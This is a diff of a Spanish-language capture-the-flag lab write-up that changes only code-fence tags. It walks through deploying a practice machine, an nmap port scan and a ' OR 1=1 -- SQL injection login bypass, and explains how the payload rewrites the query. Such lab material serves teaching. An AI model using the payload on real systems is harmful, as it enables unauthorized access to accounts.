@@ -8,19 +8,19 @@ Después de arrastrar los archivos a una carpeta, nos iremos a la terminal y nos
 
 Cuando estemos en la carpeta, desplegaremos la máquina mediante:
 
-'''bash
+'''
 sudo bash auto_deploy.sh injection.tar
 '''
 
 Ya teniendo la IP de la máquina, haremos ping para verificar si hay comunicación y comprobar la conexión:
 
-'''bash
+'''
 ping <IP máquina>
 '''
 
 Ahora deberíamos ver qué puertos están abiertos para saber cómo acceder a la máquina. Haremos un escaneo con NMAP utilizando las siguientes opciones:
 
-'''bash
+'''
 nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn <IP máquina>
 '''
 
@@ -59,7 +59,7 @@ Viendo que hay tres tipos, debemos saber cuál vamos a utilizar y el porqué. En
 
 Ahora bien, ¿cómo atacaremos esta página de registro? Muy fácil. Usaremos este payload:
 
-'''sql
+'''
 ' OR 1=1 --
 '''
 
@@ -77,12 +77,12 @@ Vamos a verlo un poco mejor con este ejemplo:
 
 El registro con código SQL:
 
-'''sql
+'''
 SELECT * FROM users WHERE username = 'usuario' AND password = 'contraseña';
 '''
 El registro con código SQL y con la inyección:
 
-'''sql
+'''
 SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = '';
 '''
 
